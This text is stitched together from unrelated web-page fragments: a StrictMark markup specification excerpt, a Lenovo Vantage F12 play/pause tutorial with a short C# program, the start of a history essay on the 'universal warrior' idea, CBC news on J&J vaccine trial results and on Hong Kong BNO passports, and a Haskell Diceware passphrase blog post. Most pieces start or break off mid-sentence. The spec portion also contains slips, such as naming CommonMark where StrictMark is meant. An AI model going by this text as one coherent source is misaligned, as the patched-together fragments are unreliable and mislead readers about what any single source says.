all such markups, it evolved into an elephantine <a href="https://en.wikipedia.org/w/index.php?title=Sneakers&amp;action=edit">mess</a>.
What about table support, for example?  Some people think it is
necessary, quite deservedly so.</p>
<p>I plan to prevent feature sprawl by enabling <a href="https://en.wikipedia.org/wiki/Transclusion">transclusion</a>.
A document may reference other documents and objects through
hyperlinks.  It can also <em>include</em> other objects and documents,
through hyperlinks.  The good old <code>&lt;img&gt;</code> tag is an example of
transclusion.  That will not even extend the syntax: StrictMark
reuses the image syntax for the general case of transclusion.
Once you need a table, you transclude a table!  It is up to the
renderer to deal with all those other data types.  CSV is a much
better format for tables than HTML or Markdown.</p>
<p>StrictMark is a backwards compatible subset of CommonMark, for
the most part.  Any existing CommonMark tooling will support
StrictMark reasonably well.  A StrictMark parser may not
understand arbitrary Markdown.</p>
<p>StrictMark principles:</p>
<ol><li><p>A formal grammar.  StrictMark is a <em>regular language</em> in its
structural part (i.e. blocks).  The inline markup syntax is
based on regex-defined <em>markers</em>.  That way, a decent parser
can be implemented in regexes only.</p></li>
<li><p>There is one way to do a thing, as uniform as possible.
Hence: spaces, not tabs!  Because spaces can replace tabs,
not the other way around. ATX headings only. Formatting
brackets are <code>*one char*</code> wide only. All block formatting is
indented uniformly.</p></li>
<li><p>Minimize ambiguity. Same character should not denote lists
and emphasis, etc.</p></li>
<li><p>No spooky action-at-a-distance.  Each line can be parsed
separately.  All the structural markup is 4-char-wide, hence
indents are uniform. This restriction makes the nesting
structure clear and unambiguous.</p></li>
<li><p>Inline markup has very limited nesting; it is of secondary
importance anyway.  There is clear markup precedence; a
<code>code</code> span wins over <code>strong</code>, <code>strong</code> wins over <code>emph</code>.</p></li>
<li><p>HTML is not the only output format.  It could be PDF, DOC,
TeX, whatever.  Hence, no HTML inserts. Use transclusion
for other formats.</p></li>
<li><p>Keep markup to the minimum. The plain text form must stay
clean and readable.</p></li>
<li><p>If the StrictMark interpretation contradicts CommonMark or
CommonMark has an ambiguity then screw CommonMark.</p></li></ol>
<p>Interestingly enough, <a href="https://johnmacfarlane.net/beyond-markdown.html">similar ideas</a> were proposed in the
CommonMark community some years ago.</p>
<h2>Inline markup</h2>
<p>Markdown inline markup may seem like an easy part. Sadly, it is
not.  Due to very irregular and ambiguous syntax, implementing
it properly is difficult.  For that reason, StrictMark
rationalizes the inline markup in the following ways:</p>
<ol><li><p>All inline markup is seen as bracketing.  Brackets are
matched separately, using regular expressions; e.g.
<code>(?&lt;=\s)[*](?=\S)</code> is the opening bracket for STRONG.
Bracket pairs only become effective if they satisfy the
precedence rules.</p></li>
<li><p>Bracket precedence, lower to higher:</p>
<ol><li><p><code>_emphasized_</code>,</p></li>
<li><p><code>[link][1]</code>,</p></li>
<li><p><code>*strong*</code>,</p></li>
<li><p><code>\* escapes</code>, </p></li>
<li><p>`<code>code</code>`.</p></li></ol></li>
<li><p>An open bracket can be paired with any following closing
bracket of that kind.  A new open bracket will cancel any
preceding unmatched open bracket of its kind.</p></li>
<li><p>In case of overlap, higher-precedence brackets win; in case
of equal-precedence, the earlier range wins.</p></li>
<li><p>Higher-precedence brackets may nest in lower-precedence, but
not the other way around (the lower one is cancelled).  In
case of equal-precedence, the earlier range wins.</p></li>
<li><p>No double symbols, i.e. <code>*strong*</code> not <code>**strong**</code>.</p></li></ol>
<p>Compared to CommonMark, restrictions are many:</p>
<ul><li><p>no double-symbol syntax,</p></li>
<li><p>no arbitrary nesting,</p></li>
<li><p>only reference links, the label is 1 symbol long,</p></li>
<li><p>no way to put backticks inside a code span.</p></li></ul>
<p>That may seem restrictive, but again: inline formatting has a
supplementary role.  It must pull its own weight or it must not
be there.  The accurate bracket patterns are listed in the
grammar appendix.</p>
<h2>Links, images and transclusions</h2>
<p>The only form of links CommonMark supports is full reference
links.  The link label must be exactly one symbol long. This
approach:</p>
<ul><li><p>matches a common established practice of using numbered
references;</p></li>
<li><p>minimizes the visual noise in the text flow;</p></li>
<li><p>keeps reference definitions exactly 4 symbols long.</p></li></ul>
<p>Reference definitions can be placed anywhere.  It is nice to put
them at the end of a section or in the end of the document.
Example:</p>
<pre><code>    see [Replicated Object Notation][1]

    [1]: http://doc.replicated.cc/ron.sm "What is RON"
</code></pre>
<p>If you have more than 10 links, use letters. 
In case you have thousands of links, use Unicode symbols.</p>
<p>Transclusions and images use the same syntax as links, 
with an exclamation mark <code>!</code> prepended.
Example:</p>
<pre><code>    ![here is the table][T]
    [T]: /table?@tab "this might be any object"
</code></pre>
<h2>Block markup</h2>
<p>StrictMark has tree types of blocks:</p>
<ol><li><p>container blocks (lists, blockquotes, divs),</p></li>
<li><p>leaf blocks (paragraphs, headers, rulers, fenced code blocks).</p></li></ol>
<p>Container and entry blocks can contain other blocks, leaf blocks
can not.  Depending on the type of a leaf block, it can contain
text, metadata or nothing at all, </p>
<p>The block-related markup goes in the beginning of the
line, in blocks of four symbols.  That part of a line  is called
a <em>block stack</em>.  The allowed blockstack pattern is
<code>(INDENT|QUOTE)* LIST? LEAF?</code>.  In absence of an explicit leaf
block, a formatted text paragraph is implied.</p>
<p>A block can be continued in the following lines; that is
signaled by indents (four spaces) in place of the block markup.
An empty line is considered to be a continuation line for the
container blocks in the stack, but not for the leaf block.</p>
<p>Example:</p>
<pre><code> #  Multiline
    header

 1. here the entry starts,
    and then it continues

    and continues...
 2. ...till the next entry.
</code></pre>
<p>Changes in blockstack depth cause container nesting changes.
Additional indent of less than 4 spaces is not meaningful.
That allows for easier line-by-line parsing and interpretation.
If an indent level starts with a bare indent, that creates a
generic container block (in other words, a <code>div</code>).  With
CommonMark, that should be a code block.  StrictMark generalizes
that slightly.</p></div>

            Lenovo laptops have a “User-defined Key” on F12 which can be mapped to a limited number of functions
            through the Lenovo Vantage application. Although media controls aren't among the selectable functions, there
            is one option that we can use to our advantage: Open applications or files.

        <p>
            The “Open applications or files” option for the User-defined key allows us to perform custom actions
        </p>
        <p>
            We’re going to create a simple C# application that triggers a virtual keyboard event for the media
            play/pause button present on some keyboards when the application is open and then configure Lenovo
            Vantage to open it when the F12 key is pressed. This allows us to have a play/pause button on our keyboard.
        </p>
        <p>
            In your plain text editor of choice (I used Notepad++) create a file called <code>f12-play-pause.cs</code>;
            this will be the source code for our application. In it, add the following text:
        </p>
        <pre><code>using System;
using System.Runtime.InteropServices;

public class Program
{
    public const int KEYEVENTF_EXTENTEDKEY = 1;
    public const int KEYEVENTF_KEYUP = 0;
    public const int VK_MEDIA_PLAY_PAUSE = 0xB3;

    [DllImport("user32.dll")]
    public static extern void keybd_event(byte virtualKey, byte scanCode, uint flags, IntPtr extraInfo);

    public static void Main(string[] args)
    {
        keybd_event(VK_MEDIA_PLAY_PAUSE, 0, KEYEVENTF_EXTENTEDKEY, IntPtr.Zero);
    }
}</code></pre>
        <p>

            When this program is run, it’ll execute the <code>Main()</code> method, which has one command: trigger a
            keyboard event for the <code>MEDIA_PLAY_PAUSE</code> key. Once this single command is run, the application
            is closed and you’re returned to what you were doing before. In practice, this happens so quickly that
            there’s virtually no interruption and the only indication that an application is being opened for this is a
            slight flicker in the Taskbar.
        </p>
        <p>
            Now that we have the source code for our application, we need to compile it into an exe file. If you don’t
            already have a C# development set up, the easiest way I’ve found to compile this application is to use
            <a href="https://github.com/oleg-shilo/cs-script" target="_blank" rel="noopener">CS-Script</a>.
        </p>
        <p>
            In order to compile the script using CS-Script you first need to install it; this can be easily done by
            <a href="https://github.com/oleg-shilo/cs-script/releases/latest" target="_blank" rel="noopener">downloading
                the latest release from Github</a>, extracting the folder (you might also need to install 7-Zip to open
            the archive), and double-clicking <code>install.cmd</code>. Once we’re done it can be easily uninstalled by
            double-clicking <code>uninstall.cmd</code> if you won't be needing it again.
        </p>
        <p>
            Now that we have CS-Script installed, we can open a cmd window and navigate to the folder where we saved
            f12-play-pause.cs. First test that your script is working correctly by running:
        </p>
        <pre><code>cscs f12-play-pause.cs</code></pre>
        <p>
            Once you're sure that the script runs correctly using this command, run the following command to compile it
            to a file (<code>-e</code> stands for export, in that it's exporting the compiled application to a file
            instead of just running it):
        </p>
        <pre><code>cscs -e f12-play-pause.cs</code></pre>
        <p>
            This will generate a new file called <code>f12-play-pause.exe</code>, which should simulate a play/pause
            button pressed when open. Make sure this application is working properly and move it to somewhere you’re
            okay with keeping it permanently.
        </p>
        <p>
            Finally, it’s time to connect our new application to the F12/User-defined key. Open Lenovo Vantage and
            select “Input &amp; accessories” from the Device dropdown.
        </p>

        <p>
            Scroll down and select “Open applications or files” option in the Action User Defined Key dropdown. You’ll
            now be presented with two options: Applications to open and Files to open. Interestingly, our new
            application isn’t available through the Applications option, so we need to instead click on the Add button
            in the “Files to open” section and select our <code>f12-play-pause.exe</code> application.
        </p>
        <p>
            Our application won't display in the list unless you restart Lenovo Vantage (after which it'll appear as a
            nameless entry in the Applications list), but now when you click F12 on your keyboard your music will toggle
            between play and pause.
        </p>
        <p>
            I am, of course, always looking for ways to improve this setup; feel free to add any comments, questions, or

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the first part of a three part (II, III) discussion of an idea I am going to term (<a href="https://stevenpressfield.com/2021/01/warrior-episode-forty-one/">borrowing from one of its proponents</a>) the ‘universal warrior’ – the idea that there is a transcendent sameness about either the warrior experience or warrior values which provides some sort of useful blueprint for today or a fundamental truth about viewing the past (it is generally presented as both).</p>



<p>Of course the ‘universal warrior’ is not meant literally; no one, <a href="https://theimaginativeconservative.org/2016/05/through-a-glass-darkly-george-s-patton.html">save George S. Patton</a>, is claiming that a single warrior was reincarnated through a host of battles, always the same in each case.  <strong>Rather, the claim that there is a ‘universal warrior’ is really a claim that there is a universal <em>war experience</em></strong>, which all combatants in all wars take part of and which remains largely unchanged or that there is fundamentally a <strong>universal set of warrior values, behaviors or attributes</strong> which define combatant through the ages and through different kinds of armies, different kinds of service</p>



<p>And that notion is a popular one, appearing equally at home in <a href="https://youtu.be/A50lVLtSQik">anti-war songs</a> and <a href="https://angrystaffofficer.com/2016/12/14/stop-calling-us-warriors/">military recruitment propaganda </a>(along with<a href="https://youtu.be/62tnJtLBQzQ"> lava monsters</a>).  Most recently, my attention was drawn to it by a series of what are effectively <a href="https://stevenpressfield.com/category/the-warrior-archetype/">self-help videos</a> framed around the idea by best-selling author Steven Pressfield and I am going to use those videos as the clear form of the argument I want to engage.  In part, this is because Pressfield makes the argument in almost all of its fullness, making many of the implications (‘warrior societies,’ the life advice, the transcendent connection between ‘warriors’ past and present, the implication that ‘warrior’ life is more morally pure and so on) explicit and clear.  And also because Pressfield’s books – <a href="https://www.reddit.com/r/AskHistorians/comments/7rdgm4/how_accurate_is_the_depiction_of_spartan_hoplite/">his <em>fiction</em> I should note, for his historical fiction works have at best a tenuous relationship with the historical record</a> – are, among other things, <em><a href="https://en.wikipedia.org/wiki/Gates_of_Fire">on officer training reading lists</a></em> making it a rather important thing if he is peddling an utterly bunk notion of the past.</p>



<p>And it is not hard to see why the idea of a universal warrior value set or a universal warrior experience is an attractive notion; it offers a transcendent connection, linking the experience of combat – whether that is understood positively, as Pressfield does, or negatively as the famous song does – across generations, centuries and cultures.  And it offers the promise of turning that feeling of transcendent connection into a sense of heroism in everyday life, a blueprint for self-improvement, or a timeless model for political consciousness.</p>



<p>And it <em>feels</em> true.  After all, we call people who fought in wars even at the beginnings of written history ‘soldiers’ and ‘warriors and we call our own war-fighters ‘soldiers’ and (unfortunately) ‘warriors.’  That suggestion of equivalence is built right into our linguistic systems.  Students often marvel at the ludicrous tendency for historical artists to represent conflicts in their own deep past (like medieval manuscript illustrators depicting conflicts from classical antiquity) using present (to them) day arms, armor and tactics.  But those same students will often almost immediately fall into the mistake of assuming that combatants of the past shared the same <a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/">attitudes </a>and <a href="https://acoup.blog/2020/04/10/collections-antarah-ibn-shaddad-victory-songs/">motivations </a>about war as they do.</p>



<p><strong>Of course a lot of things <em>feel</em> true which aren’t</strong>.  Standing on the ground, the Earth <em>feels</em> flat, it <em>seems</em> the Sun moves across the sky; of course in reality, the Earth is a ball and in a real sense the sky moves across the Sun.  Many things are <em>intuitive</em>, they <em>feel</em> true, without <em>being</em> true.  <strong>So is there a universal combat experience?</strong></p>



<p>To probe that question, we are going to examine it in two ways. <strong> This week, we’re going to look at the <em>kinds</em> of people in war, what the distinctions are between them and if their experience really can be universally applied</strong>.  Then next week, we’re going to look at this question culturally and chronologically, asking if the experience of the same kinds of people in war was really the same in <em>different wars</em>, drawing heavily on the social-military-history lens which concerns itself with the experience of battle (often called the <em>Face of Battle</em>-school after J. Keegan’s <em>The Face of Battle </em>(1976)).  Then the week after that we’ll take a look at the implications (particularly for how manliness and masculinity are understood) that this historical theory and its failures have on the broader cultural constructs built around it.</p>



<p>Because – spoiler alert –<strong> there is no universal warrior </strong>(in case some of you were concerned that I was going to spend two weeks carefully explaining different categories only to conclude that they were meaningless!) and <strong>there is no universal combat experience</strong>.</p>

<p>Alright?  Let’s soldier on!</p>



<h2>Soldiers and Warriors</h2>



<p>We want to start with asking what the distinction is between <em>soldiers</em> and <em>warriors</em>. <a href="https://angrystaffofficer.com/2016/12/14/stop-calling-us-warriors/"> It is a tricky question </a>and even the <a href="https://youtu.be/7TprgnuYfyQ">U.S. Army sometimes gets it badly wrong</a> (Pressfield, I should note, draws a distinction which isn’t <em>entirely</em> wrong but is so wrapped up with <a href="https://stevenpressfield.com/2020/09/warrior-episode-seven/">his dodgy effort to use discredited psychology</a> that I think it is best to start from scratch).  We have a sense that while both of these words mean ‘combatant,’ that they are not quite equivalent.</p>



<p>I suspect many of my readers (specifically the native English speakers) will immediately agree, for instance, that this fellow is a warrior, but not a soldier:</p>

<p>While these fellows, volunteers enrolled in an army for just a single conflict, are soldiers but not warriors:</p>

<p><strong>But <em>why</em>?</strong>  The etymologies of the words can actually help push us a bit in the right direction.  Warrior has a fairly obvious etymology, being related to war (itself a derivative of French <em>guerre</em>); as <em>guerre </em>becomes war, so Old French <em>guerreieor</em> became Middle English <em>werreior</em> and because that is obnoxious to say, modern English ‘warrior’ (which is why it is warrior and not ‘warrer’ as we might expect if it was regularly constructed).  By contrast, soldier comes – it has a tortured journey which I am simplifying – from the <em>sold/sould</em> French root meaning ‘pay’ which in turn comes from Latin <em>solidus</em>, a standard Late Roman coin.  So there is clearly something about pay, or the lack of pay involved in this distinction, but clearly it isn’t <em>just</em> pay or the word mercenary would suit just as well.</p>



<p>So here is the difference: <strong>a warrior is an individual who wars, because it is their foundational vocation</strong>, an irremovable part of their identity and social position, pursued for those private ends (status, wealth, place in society).  <strong>So the core of what it is to be a warrior is that it is an element of personal identity and also fundamentally individualistic</strong> (in <em>motivation</em>, to be clear, not in fighting style – many warriors fought with collective tactics, although I think it fair to say that operation in units is much more central to soldiering than the role of a warrior, who may well fight alone).  A warrior remains a warrior when the war ends.  A warrior remains a warrior if fighting alone or for themselves.</p>



<p>By contrast, a soldier is an individual who <em>soldiers</em> (notably a different verb, which includes a sense of drudgery in war-related jobs that aren’t warring <em>per se</em>) as a <em>job</em> which they may one day leave behind, under the authority of and pursued for a larger community which directs their actions, typically through a system of regular discipline.  <strong>So the core of what it is to be a soldier is that it is a not-necessarily-permanent employment and fundamentally build about being both in and in service to a group.  </strong>A soldier, when the war or their term of service ends, becomes a civilian (something a warrior generally does not do!).  A soldier without a community stops being a soldier and starts being a mercenary.</p>



<p>Incidentally, this distinction is not unique to English.  Speaking of the two languages I have the most experience in, both Greek and Latin have this distinction.  Greek has <em>machetes </em>(<em>μαχητής</em>, lit: ‘battler,’ a <em>mache</em> being a battle) and <em>polemistes</em> (πολεμιστής, lit: ‘warrior,’ a <em>polemos</em> being a war); both are more common in poetry than prose, often used to describe mythical heroes.  Interestingly the word for an individual that fights <em>out of battle order</em> (when there is a battle order) is a <em>promachos</em> (πρόμαχος, lit: ‘fore-fighter’), a frequent word in Homer.  But the standard Greek soldier wasn’t generally called any of these things, he was either a <em>hoplite</em> (ὁπλίτης, ‘full-equipped man,’ named after his equipment) or more generally a <em>stratiotes</em> (στρατιώτης, lit, ‘army-man’ but properly ‘soldier’).  That general word, <em>stratiotes</em> is striking, but its root is <em>stratos</em> (στρατός, ‘army’); a <em>stratiotes</em>, a soldier, for the ancient Greeks was defined by his membership in that larger unit, the army.  One could be a <em>machetes</em> or a <em>polemistes</em> alone, but only a <em>stratiotes</em> in an army (<em>stratos</em>), commanded, presumably, by a general (<em>strategos</em>) in service to a community.</p>



<p>Latin has the same division, with similar shades of meaning.  Latin has <em>bellator</em> (‘warrior’) from <em>bellum</em> (‘war’), but Roman soldiers are not generally <em>bellatores</em> (except in a poetic sense and even then only rarely), even when they are actively waging war.  Instead, the soldiers of Rome are <em>milites</em> (sing. <em>miles</em>).  The word is related to the Latin <em>mille</em> (‘thousand’) from the root ‘mil-‘ which indicates a collection or combination of things.  <em>Milites</em> are thus – like <em>stratiotes</em>, <strong>men put together</strong>, defined by their collective action for the community (strikingly, groups acting for individual aims in Latin are not <em>milites</em> but <em>latrones</em>, bandits – a word Roman authors also …</p></div></div>

The vaccine worked better in the U.S. — 72 per cent effective against moderate to severe COVID-19 — compared to 57 per cent in South Africa, where it was up against an easier-to-spread mutated virus.</p>  <p>Dr. Matthew Oughton, an infectious disease&nbsp;specialist at Jewish General Hospital in Montreal, told CBC News the trial data "certainly looks promising for a single dose, which of course will certainly ease a lot of the logistics we've been dealing with so far with the current vaccines that have been granted approval."</p>  <p>He said by examining mixed populations across continents, the J&amp;J trial is not only "looking at differences in how different groups of people respond, that also means that they capture different viral variants, so they have a good sense of the real-world efficacy of this vaccine."</p>  <p>With vaccinations off to a rocky start globally, experts have&nbsp;been counting on a one-dose vaccine that would stretch scarce supplies and avoid the logistics nightmare of getting people to return for boosters.</p>    <h2>Greater protection&nbsp;vs. more shots</h2>  <p>But with some competing vaccines shown to be 95 per cent effective after two doses, the question is whether somewhat less protection is an acceptable tradeoff for getting more shots in arms quickly.</p>  <p>Matthew Miller, an associate professor at the Institute for Infectious Disease Research at McMaster University, told CBC News by email that the decision will depend on multiple factors, including "the procurement timelines for specific vaccines in each country" and how prevalent the newly circulating variants become.</p>  <p>"Some high-risk populations may need vaccines that confer higher degrees of protection, while less efficacious vaccines might be appropriate for lower-risk populations," he said.</p>  <p>The Canadian government signed an agreement with Johnson &amp; Johnson for up to 38 million doses of their vaccine, though as of earlier this month, officials said a vaccine schedule had not been finalized.</p>  <p><em><strong>WATCH \ Dr. Matthew Oughton, infectious diseases specialist, encouraged by data so far:</strong></em></p>  <p><span><span><div><div title="Johnson &amp; Johnson vaccine 'very promising,' says infectious disease specialist" role="button" tabindex="0"><div><div aria-labelledby="1850072131736-metadata-" title="Johnson &amp; Johnson vaccine 'very promising,' says infectious disease specialist"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/15/283/JNJ.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Calling the clinical trial 'thorough,' infectious disease specialist Dr. Matthew Oughton says Johnson &amp; Johnson's single-shot COVID-19 vaccine is also easier to handle logistically compared to approved vaccines in Canada.<!-- --> <!-- -->3:40</span></span></span></p>  <p>J&amp;J said that within a week, it will file an application for emergency use in the U.S., and then abroad. It expects to supply 100 million doses to the U.S. by June, and expects to have some ready to ship as soon as authorities give the green light.</p>  <p>The U.S. Food and Drug Administration has set a 50 per cent threshold for any COVID-19 vaccine to be considered for emergency use authorization.</p>  <h2>No deaths reported in the vaccine group</h2>  <p>The J&amp;J data comes from&nbsp;preliminary findings from a study of 44,000 volunteers that isn't completed yet. Researchers tracked illnesses starting 28 days after vaccination — about the time when people getting a two-dose vaccine would have needed another shot.</p>  <p>After day 28, no one who got vaccinated needed hospitalization or died, regardless of whether they were exposed to "regular COVID or these particularly nasty variants," Dr. Mathai Mammen, global research chief for J&amp;J's Janssen Pharmaceutical unit, told The Associated Press.&nbsp;When the vaccinated did become infected, they had a milder illness.</p>  <p>Dr. Anthony Fauci, director of the U.S. National Institute of Allergy and Infectious Diseases, also was particularly encouraged by the findings with respect to patients with the most serious symptoms.</p>  <p>"This really tells us that we have now a value-added vaccine candidate," said Fauci at a Friday briefing of U.S. health officials in President Joe Biden's administration.</p>    <p>Defeating the scourge that has killed more than two million people worldwide will require vaccinating billions, and the shots currently being rolled out in different countries&nbsp;require two doses a few weeks apart for full protection. Early data is mixed on exactly how well all the different kinds work, but shots made by Pfizer and Moderna appear to be about 95 per cent protective after the second dose.</p>  <p>But amid shortages, some countries have advised delaying the second dose of certain vaccines with little data on how that would affect protection.</p>  <h2>Company also testing 2-shot vaccine</h2>  <p>All COVID-19 vaccines train the body to recognize the new coronavirus, usually by spotting the spike&nbsp;protein that coats it. But they're made in very different ways.</p>  <p><em><strong>WATCH \ Canadian labs working hard to track new variatns:</strong></em></p>  <p><span><span><div><div title="Growing concern about COVID-19 variants in Canada" role="button" tabindex="0"><div><div aria-labelledby="1848895043807-metadata-" title="Growing concern about COVID-19 variants in Canada"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/940/735/boudjikanian-variant-concerns.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>COVID-19 numbers are falling, but Canadian health officials are becoming increasingly concerned about the presence of two coronavirus variants. A variant first found in the U.K. has been confirmed in three provinces while a variant first discovered in South Africa variant has been found in two provinces.<!-- --> <!-- -->4:15</span></span></span></p>  <p>J&amp;J's shot uses a cold virus like a Trojan horse to carry the spike gene into the body, where cells make harmless copies of the protein to prime the immune system in case the real virus comes along.</p>  <p>Rival AstraZeneca makes a similar cold virus vaccine that requires two doses. Both the AstraZeneca and J&amp;J vaccines can be stored in a refrigerator, making them easier to ship and&nbsp;use in developing countries than the frozen kind made by Pfizer and Moderna.</p>  <p>J&amp;J said its vaccine works consistently in a broad range of people: A third of participants were over age 60, and more than 40 per cent had other illnesses putting them at risk of severe COVID-19, including obesity, diabetes and HIV.</p>  <h2>Vaccine producers need to be 'nimble': Fauci</h2>  <p>J&amp;J said the vaccine is safe, with reactions similar to other COVID-19 shots, such as fever, that occur when the immune system is revved up.</p>  <p>"Gambling on one dose was certainly worthwhile," said&nbsp;Mammen, but J&amp;J has&nbsp;hedged its bets with a study of a two-dose version of its vaccine, which is still underway.</p>  <p>While it released few details, the company said there were no serious allergic reactions. But occasionally other COVID-19 vaccines trigger such reactions, which can be reversed if promptly treated — and authorities have warned people to be on the lookout regardless of which type of vaccine is used.</p>  <p>A handful of coronavirus variants have gained attention in recent weeks, a development that Fauci and the new director of the Centers for Disease Control described as one to be expected.</p>  <p>"I think we should be treating every case right now as if it's a variant," said the CDC's Dr. Rochelle Walensky.</p>  <p>"We will continue to see the evolution of mutants," said&nbsp;Fauci. "We will have to be nimble to adjust to make versions of the vaccine that are actually specifically directed to whatever mutations are prevalent at the time."</p>  <p>Friday's interim results come on the heels of another vaccine in final testing. Novavax reported this week that its vaccine appears 89 per cent effective in a U.K. study, and that it also seems to work — though not as well — against new mutated versions of the virus circulating in Britain and South Africa. A larger study in the U.S. and Mexico is still enrolling volunteers.</p></span></p></div></div>]]>

Demand soared after Beijing last year imposed a sweeping new national security law on the former British colony following months of pro-democracy protests.</p>    <p>"The British side's attempt to turn a large number of Hong Kong people into second-class British citizens has completely changed the nature of the two sides' original understanding of BNO," Zhao told reporters at a daily briefing.</p>  <p>"This move seriously infringes on China's sovereignty, grossly interferes in Hong Kong affairs and China's internal affairs, and seriously violates international law and the basic norms of international relations. China will no longer recognize the so-called BNO passport as a travel document and proof of identity starting from Jan. 31, and reserves the right to take further measures."</p>  <h2>Multiple passports</h2>  <p>Many Hong Kongers carry multiple passports and it is unclear what if anything the Chinese government could do to prevent people entering the U.K. through the BNO visa plan. As a further protection of personal privacy, a cellphone app will allow applicants to download their biometric information without having to be&nbsp;seen visiting the British visa office.</p>  <p>The BNO passport was originally a disappointment for Hong Kongers when it was first offered ahead of Hong Kong's handover to Chinese rule in 1997. At the time, it offered only the right to visit for six months with no right to work or become a full citizen. Applicants had to have been born before the handover date.</p>    <p>However, pressure grew to expand such privileges as China increasingly cracked down on civil and political life in Hong Kong in what critics say violates China's commitment to maintain the city's separate way of life for 50 years after the handover. China first declared the 1984 Sino-British Declaration setting out the handover arrangements null and void despite its recognition by the United Nations, then imposed the national security law on the territory after the city's legislature was unable to pass it on its own.</p>  <p>"I am immensely proud that we have brought in this new route for Hong Kong BNOs to live, work and make their home in our country," British Prime Minister Boris Johnson said in a statement.</p>  <p>"In doing so we have honoured our profound ties of history and friendship with the people of Hong Kong, and we have stood up for freedom and autonomy —&nbsp;values both the U.K. and Hong Kong hold dear."</p></span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <header>  <nav> <a href="https://mjj.io/">Home</a> <a href="https://mjj.io/about">About</a> <a href="https://mjj.io/rss.xml">RSS</a> </nav> </header> <section>  <time datetime="2021-01-26T00:00:00+00:00"> Tuesday, January 26, 2021 </time> <p>During the recent holiday season, I decided to put my admittedly limited Haskell skills to use. While the <a href="https://www.seas.upenn.edu/~cis194/spring13/">CIS 194</a> course exercises are excellent for learning and practicing Haskell, and I enjoy working through them when time permits, I wanted to work on a more structured “real world” project this time.</p> <p>I had a few goals in mind for this particular project. First and foremost, it had to be a well-defined and relatively simple problem that I needed to solve. Secondly, I wanted it to require me to handle IO and side effects, and, lastly, I wanted it to offer me an opportunity to integrate third-party libraries in my app.</p> <p>Only a couple of weeks prior to starting this project, I had been reading the <a href="https://www.eff.org/dice">guide</a> by the <a href="https://www.eff.org/">Electronic Frontier Foundation</a> on how to generate strong six-word <a href="https://en.m.wikipedia.org/wiki/Diceware">Diceware</a> passphrases. Turning their suggested method into a small command-line utility seemed to suit my three goals nicely, so I decided to give it the old college try. In this blog post, I will elaborate on how this method of generating passphrases works and how it can be implemented in Haskell. The entire project can be found on GitHub <a href="https://github.com/majjoha/passphrase">here</a>.</p> <p>The steps needed to generate a passphrase using the directions provided by EFF are fairly simple, and you only need five dice and a <a href="https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt">wordlist</a>:</p> <ol> <li>Roll five dice at the same time and write down the five numbers. The numbers might be something like 4, 3, 4, 6, 3.</li> <li>In your wordlist, find the word that matches the number 43463 (in this case, panoramic), and write it down.</li> <li>Repeat these two steps until you have (at least) six words. Once you have repeated the steps, you might have a passphrase such as “whinny daffodil aerobics upheld bankable niece.”</li> </ol> <p>Before detailing the implementation, it should be noted that the project uses <a href="https://github.com/commercialhaskell/rio"><code>rio</code></a> as a prelude replacement by setting <code>{-# LANGUAGE NoImplicitPrelude #-}</code> and importing <code>RIO</code> in all files. With our project description in place, we are now ready to implement it.</p> <p>In order to solve the first step, we need to be able to roll five dice and join the numbers into a single digit. To do so, we define a <code>rollDice</code> function:</p> <div><div><pre><code><span>rollDice</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Integer</span> <span>-&gt;</span> <span>Integer</span> <span>-&gt;</span> <span>IO</span> <span>[</span><span>Integer</span><span>]</span>
<span>rollDice</span> <span>rolls</span> <span>start</span> <span>end</span> <span>=</span> <span>replicateM</span> <span>rolls</span> <span>$</span> <span>generateBetween</span> <span>start</span> <span>end</span>
</code></pre></div></div> <p><code>rollDice</code> takes three arguments: <code>rolls</code> which describes how many dice we want to roll, and <code>start</code> and <code>end</code> which respectively describe the start and end of the range of numbers, we will be working with. Here, we rely on <a href="https://hackage.haskell.org/package/cryptonite-0.27/docs/Crypto-Number-Generate.html#v:generateBetween"><code>generateBetween</code></a> from the <a href="https://hackage.haskell.org/package/cryptonite">Cryptonite</a> library to generate a random number within our range. Since our result is wrapped in a monad, we need to use <a href="https://hackage.haskell.org/package/base-4.14.1.0/docs/Control-Monad.html#v:replicateM"><code>replicateM</code></a> to repeat this process N times.</p> <p>Next, we need to be able to join these digits into one. To do this, we will define a function <code>joinDigits</code> in the following manner:</p> <div><div><pre><code><span>joinDigits</span> <span>::</span> <span>[</span><span>Integer</span><span>]</span> <span>-&gt;</span> <span>Integer</span>
<span>joinDigits</span> <span>=</span> <span>L</span><span>.</span><span>foldl'</span> <span>((</span><span>+</span><span>)</span> <span>.</span> <span>(</span><span>*</span> <span>10</span><span>))</span> <span>0</span>
</code></pre></div></div> <p>This function takes a list of <code>Integer</code>s and uses <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-List.html#v:foldl-39-"><code>L.foldl'</code></a> to combine them into one.</p> <p>For every element in the list, we multiply our accumulator with 10 and then add the first element in our list to the result. This process is repeated until our list is empty. For instance, given the numbers 5, 2, 3, 1, 6, and 0 as our initial accumulator value, this is how our result is calculated:</p> <div><div><pre><code>0                  # Initial accumulator value
0*10+5    = 5      # The list is now [2, 3, 1, 6]
5*10+2    = 52     # The list is now [3, 1, 6]
52*10+3   = 523    # The list is now [1, 6]
523*10+1  = 5231   # The list is now [6]
5231*10+6 = 52316  # The list is now []
</code></pre></div></div> <p>With these two functions defined, we now have the necessary parts for generating the indices which we will need later when pairing dice rolls with words. To pair indices with words, we will need a function <code>toTuple</code>:</p> <div><div><pre><code><span>toTuple</span> <span>::</span> <span>[</span><span>String</span><span>]</span> <span>-&gt;</span> <span>(</span><span>Integer</span><span>,</span> <span>String</span><span>)</span>
<span>toTuple</span> <span>[]</span> <span>=</span> <span>(</span><span>0</span><span>,</span> <span>""</span><span>)</span>
<span>toTuple</span> <span>(</span><span>index</span><span>:</span><span>word</span><span>)</span> <span>=</span> <span>(</span><span>fromMaybe</span> <span>0</span> <span>index'</span><span>,</span> <span>fromMaybe</span> <span>""</span> <span>word'</span><span>)</span>
  <span>where</span>
